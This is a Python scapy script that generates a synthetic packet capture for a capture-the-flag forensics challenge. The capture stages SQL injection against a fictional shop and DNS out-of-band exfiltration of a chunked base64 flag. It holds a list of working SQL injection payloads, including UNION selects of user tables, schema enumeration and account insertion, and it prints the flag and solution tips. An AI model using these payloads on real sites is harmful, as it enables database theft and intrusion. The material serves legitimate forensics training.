#!/usr/bin/env python3
"""
CTF PCAP Generator - SQL Injection with DNS Out-of-Band Exfiltration
Creates a realistic network capture for forensic analysis challenges.
"""

import random
import time
import base64
from scapy.all import *

# Configuration
TARGET_WEBSITE = "www.shopline-market.net"
ATTACKER_IP = "192.168.1.100"
WEBSITE_IP = "203.0.113.50"
DNS_SERVER = "8.8.8.8"
ATTACKER_DNS_SERVER = "cdn-sync.net"  # Attacker's DNS server for OOB
LEGITIMATE_USERS = [
    "192.168.1.10", "192.168.1.15", "192.168.1.20", 
    "192.168.1.25", "192.168.1.30", "192.168.1.35"
]

# Flag to be exfiltrated
FLAG = "ACNCTF{dns_oob_sqli_data_exfiltration_challenge_2025}"
FLAG_B64 = base64.b64encode(FLAG.encode()).decode()

# Split flag into smaller chunks for DNS exfiltration (making it more challenging)
def split_into_chunks(data, chunk_size=6):  # Even smaller chunks = more DNS queries (target 6+ chunks)
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

FLAG_CHUNKS = split_into_chunks(FLAG_B64)
print(f"DEBUG: Flag will be split into {len(FLAG_CHUNKS)} chunks: {FLAG_CHUNKS}")

packets = []
current_time = time.time()

def add_packet(pkt, delay=0.1):
    global current_time
    current_time += delay + random.uniform(0, 0.5)
    pkt.time = current_time
    packets.append(pkt)

def create_dns_query(src_ip, query, qtype="A"):
    """Create a DNS query packet"""
    return IP(src=src_ip, dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65535), dport=53) / DNS(rd=1, qd=DNSQR(qname=query, qtype=qtype))

def create_dns_response(query_pkt, answer_ip=None):
    """Create a DNS response packet"""
    if answer_ip is None:
        answer_ip = "203.0.113." + str(random.randint(1, 254))
    
    response = IP(src=DNS_SERVER, dst=query_pkt[IP].src) / UDP(sport=53, dport=query_pkt[UDP].sport) / DNS(
        id=query_pkt[DNS].id,
        qr=1,
        aa=0,
        rcode=0,
        qd=query_pkt[DNS].qd,
        an=DNSRR(rrname=query_pkt[DNS].qd.qname, ttl=300, rdata=answer_ip)
    )
    return response

def create_http_request(src_ip, dst_ip, method="GET", path="/", host=TARGET_WEBSITE, data="", headers=""):
    """Create an HTTP request packet"""
    sport = random.randint(1024, 65535)
    
    if method == "GET":
        http_data = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nConnection: keep-alive\r\n{headers}\r\n"
    else:
        content_length = len(data)
        http_data = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {content_length}\r\nConnection: keep-alive\r\n{headers}\r\n{data}"
    
    return IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=80, flags="PA") / Raw(load=http_data)

def create_http_response(req_pkt, status="200 OK", content="", content_type="text/html"):
    """Create an HTTP response packet"""
    response_data = f"HTTP/1.1 {status}\r\nServer: nginx/1.18.0\r\nContent-Type: {content_type}\r\nContent-Length: {len(content)}\r\nConnection: keep-alive\r\n\r\n{content}"
    
    return IP(src=req_pkt[IP].dst, dst=req_pkt[IP].src) / TCP(sport=80, dport=req_pkt[TCP].sport, flags="PA") / Raw(load=response_data)

def create_mdns_query(src_ip, service_name):
    """Create an mDNS query packet"""
    return IP(src=src_ip, dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(rd=0, qd=DNSQR(qname=service_name + ".local", qtype="PTR"))

def create_dhcp_discover(src_ip):
    """Create a DHCP Discover packet"""
    return IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / Raw(load=b'\x01\x01\x06\x00' + b'\x00' * 232)

def create_ssdp_search(src_ip):
    """Create an SSDP search packet"""
    ssdp_data = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nST: upnp:rootdevice\r\nMX: 3\r\n\r\n"
    return IP(src=src_ip, dst="239.255.255.250") / UDP(sport=random.randint(1024, 65535), dport=1900) / Raw(load=ssdp_data)

def create_netbios_query(src_ip, name):
    """Create a NetBIOS name query"""
    return IP(src=src_ip, dst="255.255.255.255") / UDP(sport=137, dport=137) / Raw(load=b'\x00\x00\x01\x10\x00\x01\x00\x00\x00\x00\x00\x00' + name.encode().ljust(16, b'\x00'))

print("Generating CTF PCAP file with SQL injection and DNS OOB exfiltration...")
print(f"Flag: {FLAG}")
print(f"Base64 Flag: {FLAG_B64}")
print(f"Flag chunks: {FLAG_CHUNKS}")

# 1. Initial legitimate traffic and DNS setup
print("\n[1/7] Generating initial legitimate traffic...")

# DNS queries for the main website
dns_query = create_dns_query(LEGITIMATE_USERS[0], TARGET_WEBSITE)
add_packet(dns_query, 0.1)
dns_resp = create_dns_response(dns_query, WEBSITE_IP)
add_packet(dns_resp, 0.05)

# Legitimate users browsing (increased for more noise)
legitimate_pages = ["/", "/index", "/products", "/cart", "/about", "/contact", "/login", "/register", "/search", "/categories"]
for i in range(150):  # Increased from 50
    user_ip = random.choice(LEGITIMATE_USERS)
    page = random.choice(legitimate_pages)
    
    # HTTP request
    req = create_http_request(user_ip, WEBSITE_IP, "GET", page)
    add_packet(req, random.uniform(0.2, 1.5))
    
    # HTTP response
    resp = create_http_response(req, content=f"<html><head><title>ShopLine Market</title></head><body><h1>Welcome to {page}</h1></body></html>")
    add_packet(resp, 0.1)

# Background DNS noise (significantly increased)
background_domains = [
    "cdn.shopline-market.net", "fonts-api.net", "ads-tracker.io", "analytics.google.com", 
    "facebook.com", "twitter.com", "instagram.com", "linkedin.com", "youtube.com",
    "googleapis.com", "gstatic.com", "cloudflare.com", "jsdelivr.net", "unpkg.com",
    "bootstrapcdn.com", "cdnjs.cloudflare.com", "ajax.googleapis.com"
]
for i in range(120):  # Increased from 30
    user_ip = random.choice(LEGITIMATE_USERS)
    domain = random.choice(background_domains)
    dns_q = create_dns_query(user_ip, domain)
    add_packet(dns_q, random.uniform(0.1, 0.8))
    dns_r = create_dns_response(dns_q)
    add_packet(dns_r, 0.05)

# 2. Attacker reconnaissance
print("\n[2/7] Generating attacker reconnaissance...")

# Attacker DNS lookup for target
dns_query = create_dns_query(ATTACKER_IP, TARGET_WEBSITE)
add_packet(dns_query, 2.0)
dns_resp = create_dns_response(dns_query, WEBSITE_IP)
add_packet(dns_resp, 0.05)

# Attacker browsing normally first
recon_pages = ["/", "/login", "/search", "/feedback", "/admin", "/api", "/dashboard"]
for page in recon_pages:
    req = create_http_request(ATTACKER_IP, WEBSITE_IP, "GET", page)
    add_packet(req, random.uniform(1.0, 3.0))
    
    if page == "/admin":
        resp = create_http_response(req, "403 Forbidden", "<html><body><h1>403 Forbidden</h1></body></html>")
    elif page == "/api":
        resp = create_http_response(req, "404 Not Found", "<html><body><h1>404 Not Found</h1></body></html>")
    else:
        resp = create_http_response(req, content=f"<html><head><title>ShopLine - {page}</title></head><body>Page content</body></html>")
    add_packet(resp, 0.2)

# 3. SQL injection attempts
print("\n[3/7] Generating SQL injection attempts...")

sqli_payloads = [
    "username=' OR '1'='1&password=test",
    "username=admin&password=' OR '1'='1",
    "search=' UNION SELECT NULL,NULL--",
    "feedback=' OR sleep(3)--&email=test@test.com",
    "username=admin' AND 1=2 UNION SELECT NULL,user,pass FROM users--&password=test",
    "search=' OR 1=1; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",
    "username=' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables--&password=test",
    "search=' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "username=' OR 1=1 UNION SELECT user(),version()--&password=test",
    "search=' OR 1=1 UNION SELECT database(),@@version--"
]

for i, payload in enumerate(sqli_payloads):
    if i < 4:
        path = "/login"
    elif i < 7:
        path = "/search" 
    else:
        path = "/feedback"
        
    req = create_http_request(ATTACKER_IP, WEBSITE_IP, "POST", path, data=payload)
    add_packet(req, random.uniform(2.0, 5.0))
    
    if i < 6:
        # Early attempts fail
        resp = create_http_response(req, "401 Unauthorized", "<html><body><h1>Login Failed</h1></body></html>")
    else:
        # Later attempts trigger the vulnerability
        resp = create_http_response(req, content="<html><body><h1>Search Results</h1><p>Processing...</p></body></html>")
    add_packet(resp, 0.3)

# 4. Out-of-band DNS exfiltration
print(f"\n[4/7] Generating DNS out-of-band exfiltration with {len(FLAG_CHUNKS)} chunks...")

# The vulnerable server makes DNS queries to exfiltrate data
session_id = "sess" + str(random.randint(10000, 99999))

# Add some randomization to make chunks appear out of order occasionally
chunk_indices = list(range(len(FLAG_CHUNKS)))
# Occasionally shuffle a few chunks to make analysis more challenging
if random.random() < 0.4:  # 40% chance to have some out-of-order chunks
    random.shuffle(chunk_indices)

# Ensure we create ALL chunks
for i, chunk_idx in enumerate(chunk_indices):
    chunk = FLAG_CHUNKS[chunk_idx]
    
    # Server makes DNS query to attacker's domain with exfiltrated data
    # Use the original index in the domain name for proper reconstruction
    exfil_domain = f"{session_id}-{chunk_idx:02d}-{chunk}.{ATTACKER_DNS_SERVER}"
    
    # DNS query from the web server (simulating OOB exfiltration)
    dns_query = create_dns_query(WEBSITE_IP, exfil_domain)
    add_packet(dns_query, random.uniform(1.5, 4.0))  # Slightly longer delays
    
    # Response from attacker's DNS server (they control this domain)
    attacker_dns_ip = "198.51.100.10"  # Attacker's DNS server IP
    dns_resp = IP(src=attacker_dns_ip, dst=WEBSITE_IP) / UDP(sport=53, dport=dns_query[UDP].sport) / DNS(
        id=dns_query[DNS].id,
        qr=1,
        aa=1,  # Authoritative answer
        rcode=0,
        qd=dns_query[DNS].qd,
        an=DNSRR(rrname=exfil_domain, ttl=60, rdata="127.0.0.1")
    )
    add_packet(dns_resp, 0.1)

# Add more decoy DNS queries to make it more challenging
decoy_chunks = ["ZmFrZWRhdGE", "bm90cmVhbA", "ZGVjb3lkYXRh", "Ym9ndXNmbGFn", "dGVzdGRhdGE", "bm9pc2VkYXQ", "cmFuZG9tZGF0", "ZHVtbXlmbGFn"]
for i, decoy in enumerate(decoy_chunks):
    if random.random() < 0.7:  # 70% chance to include each decoy
        decoy_domain = f"cache{random.randint(100,999)}-{decoy}.{ATTACKER_DNS_SERVER}"
        dns_query = create_dns_query(WEBSITE_IP, decoy_domain)
        add_packet(dns_query, random.uniform(0.5, 2.0))
        
        dns_resp = IP(src="198.51.100.10", dst=WEBSITE_IP) / UDP(sport=53, dport=dns_query[UDP].sport) / DNS(
            id=dns_query[DNS].id,
            qr=1,
            aa=1,
            rcode=0,
            qd=dns_query[DNS].qd,
            an=DNSRR(rrname=decoy_domain, ttl=60, rdata="127.0.0.1")
        )
        add_packet(dns_resp, 0.1)

# 5. Additional noise protocols (mDNS, DHCP, SSDP, etc.)
print("\n[5/7] Adding advanced noise protocols...")

# mDNS queries
mdns_services = ["_http._tcp", "_printer._tcp", "_airplay._tcp", "_googlecast._tcp", "_spotify-connect._tcp", "_workstation._tcp"]
for i in range(40):
    user_ip = random.choice(LEGITIMATE_USERS)
    service = random.choice(mdns_services)
    mdns_query = create_mdns_query(user_ip, service)
    add_packet(mdns_query, random.uniform(0.1, 2.0))

# DHCP traffic
for i in range(15):
    user_ip = random.choice(LEGITIMATE_USERS)
    dhcp_pkt = create_dhcp_discover(user_ip)
    add_packet(dhcp_pkt, random.uniform(5.0, 30.0))

# SSDP discovery
for i in range(25):
    user_ip = random.choice(LEGITIMATE_USERS)
    ssdp_pkt = create_ssdp_search(user_ip)
    add_packet(ssdp_pkt, random.uniform(1.0, 10.0))

# NetBIOS name queries
netbios_names = ["WORKGROUP", "DESKTOP-ABC", "LAPTOP-XYZ", "PRINTER01", "SERVER01"]
for i in range(30):
    user_ip = random.choice(LEGITIMATE_USERS)
    name = random.choice(netbios_names)
    netbios_pkt = create_netbios_query(user_ip, name)
    add_packet(netbios_pkt, random.uniform(0.5, 5.0))

# LLMNR queries (Link-Local Multicast Name Resolution)
llmnr_names = ["wpad", "isatap", "teredo", "workstation1", "printer"]
for i in range(20):
    user_ip = random.choice(LEGITIMATE_USERS)
    name = random.choice(llmnr_names)
    llmnr_pkt = IP(src=user_ip, dst="224.0.0.252") / UDP(sport=5355, dport=5355) / DNS(rd=0, qd=DNSQR(qname=name, qtype="A"))
    add_packet(llmnr_pkt, random.uniform(0.5, 3.0))

# 6. More legitimate HTTP traffic to add noise
print("\n[6/7] Adding more legitimate HTTP traffic...")

# Add more legitimate user activity (significantly increased)
for i in range(300):  # Increased from 100 to reach ~2000 packets
    user_ip = random.choice(LEGITIMATE_USERS)
    
    if random.random() < 0.4:  # 40% DNS queries
        domain = random.choice(background_domains + ["shopline-market.net", "cdn.jsdelivr.net", "fonts.googleapis.com", "cdnjs.com", "unpkg.com"])
        dns_q = create_dns_query(user_ip, domain)
        add_packet(dns_q, random.uniform(0.1, 2.0))
        dns_r = create_dns_response(dns_q)
        add_packet(dns_r, 0.05)
    else:  # 60% HTTP traffic
        page = random.choice(legitimate_pages)
        if random.random() < 0.25 and page in ["/login", "/feedback", "/search"]:
            # Some legitimate POST requests
            if page == "/login":
                usernames = ["user123", "admin", "john.doe", "alice.smith", "testuser", "guest"]
                passwords = ["mypassword", "123456", "password123", "qwerty", "letmein"]
                data = f"username={random.choice(usernames)}&password={random.choice(passwords)}"
            elif page == "/feedback":
                feedbacks = ["Great+site!", "Love+the+products", "Easy+to+use", "Fast+delivery", "Excellent+service"]
                emails = ["user@example.com", "test@gmail.com", "customer@yahoo.com", "feedback@hotmail.com"]
                data = f"feedback={random.choice(feedbacks)}&email={random.choice(emails)}"
            else:  # search
                searches = ["laptops", "phones", "books", "shoes", "electronics", "clothing", "toys"]
                data = f"search={random.choice(searches)}"
            
            req = create_http_request(user_ip, WEBSITE_IP, "POST", page, data=data)
        else:
            req = create_http_request(user_ip, WEBSITE_IP, "GET", page)
        
        add_packet(req, random.uniform(0.3, 2.0))
        
        # Response
        if random.random() < 0.12:  # 12% error responses
            error_codes = ["404 Not Found", "500 Internal Server Error", "503 Service Unavailable"]
            error_code = random.choice(error_codes)
            resp = create_http_response(req, error_code, f"<html><body><h1>{error_code}</h1></body></html>")
        else:
            resp = create_http_response(req, content="<html><body>Page content here</body></html>")
        add_packet(resp, 0.15)

# Add TCP connection establishment/teardown (increased)
for i in range(50):  # Increased from 20
    user_ip = random.choice(LEGITIMATE_USERS + [ATTACKER_IP])
    sport = random.randint(1024, 65535)
    
    # SYN
    syn = IP(src=user_ip, dst=WEBSITE_IP) / TCP(sport=sport, dport=80, flags="S", seq=random.randint(1000, 9999))
    add_packet(syn, random.uniform(0.1, 1.0))
    
    # SYN-ACK
    synack = IP(src=WEBSITE_IP, dst=user_ip) / TCP(sport=80, dport=sport, flags="SA", seq=random.randint(1000, 9999), ack=syn[TCP].seq + 1)
    add_packet(synack, 0.05)
    
    # ACK
    ack = IP(src=user_ip, dst=WEBSITE_IP) / TCP(sport=sport, dport=80, flags="A", seq=syn[TCP].seq + 1, ack=synack[TCP].seq + 1)
    add_packet(ack, 0.05)

# 7. Final touches - NTP and other background protocols (enhanced)
print("\n[7/7] Adding final background protocols...")

ntp_servers = ["pool.ntp.org", "time.google.com", "time.windows.com", "time.apple.com"]
for i in range(25):  # Increased from 10
    user_ip = random.choice(LEGITIMATE_USERS)
    ntp_server = random.choice(ntp_servers)
    
    # DNS lookup for NTP server
    dns_q = create_dns_query(user_ip, ntp_server)
    add_packet(dns_q, random.uniform(10.0, 30.0))
    dns_r = create_dns_response(dns_q)
    add_packet(dns_r, 0.05)
    
    # NTP request (simplified)
    ntp_pkt = IP(src=user_ip, dst="216.239.35.0") / UDP(sport=random.randint(1024, 65535), dport=123) / Raw(load=b'\x1b' + b'\x00' * 47)
    add_packet(ntp_pkt, 0.5)

# Write the PCAP file
print(f"\nWriting {len(packets)} packets to attack_traffic.pcap...")
wrpcap("attack_traffic.pcap", packets)

print("\n" + "="*60)
print("CTF PCAP Generation Complete!")
print("="*60)
print(f"Total packets: {len(packets)}")
print(f"Output file: attack_traffic.pcap")
print(f"\nFlag: {FLAG}")
print(f"Base64 encoded: {FLAG_B64}")
print(f"Exfiltrated in {len(FLAG_CHUNKS)} DNS queries to: {ATTACKER_DNS_SERVER}")
print("\nDNS Exfiltration Domains (example pattern):")
example_session = "sess12345"
for i, chunk in enumerate(FLAG_CHUNKS[:3]):  # Show first 3 examples
    print(f"  {example_session}-{i:02d}-{chunk}.{ATTACKER_DNS_SERVER}")
if len(FLAG_CHUNKS) > 3:
    print(f"  ... and {len(FLAG_CHUNKS)-3} more chunks")

print(f"\nKey IPs:")
print(f"  Target website: {WEBSITE_IP} ({TARGET_WEBSITE})")
print(f"  Attacker: {ATTACKER_IP}")
print(f"  Attacker DNS: 198.51.100.10 ({ATTACKER_DNS_SERVER})")
print(f"  Legitimate users: {', '.join(LEGITIMATE_USERS)}")

print("\nAnalysis Tips:")
print("1. Filter for DNS queries to 'cdn-sync.net'")
print("2. Look for POST requests with SQL injection patterns")
print("3. Extract base64 data from DNS subdomain queries")
print("4. Concatenate and decode the base64 chunks to get the flag")
print("\nExample Wireshark filters:")
print("  dns.qry.name contains 'cdn-sync.net'")
print("  http.request.method == 'POST' and http contains 'UNION'")
print("  ip.src == 192.168.1.100 and http")
